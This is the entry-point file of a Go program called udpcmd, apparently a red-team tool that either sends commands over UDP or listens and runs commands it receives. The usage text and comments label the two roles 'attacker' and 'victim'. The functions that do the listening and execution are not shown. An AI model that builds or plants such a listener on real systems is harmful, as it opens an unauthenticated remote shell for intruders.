package main

/*
 * udpcmd.go
 * UDP Command Listener/Sender
 * By J. Stuart McMurray
 * Created 20160221
 * Last Modified 20160221
 */

import (
	"flag"
	"fmt"
	"os"
)

const MSGLEN = 1024                              /* Size of a packet */
var MAGIC = []byte{'U', 'D', 'P', 'C', 'M', 'D'} /* Magic number */

func main() {
	var (
		send = flag.Bool(
			"s",
			false,
			"Send a command.",
		)
		addr = flag.String(
			"a",
			"0.0.0.0:0",
			"Listen or target `address` (depending on -s).",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]

With -s, reads lines from stdin and sends them to the address given by -a.

Without -s, listens on the address given by -a (a port of 0 will cause a port
to be chosen at runtime), and executes commands sent to it.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Work out if we're an attacker or victim */
	if *send {
		attacker(*addr)
	}
	victim(*addr)
}
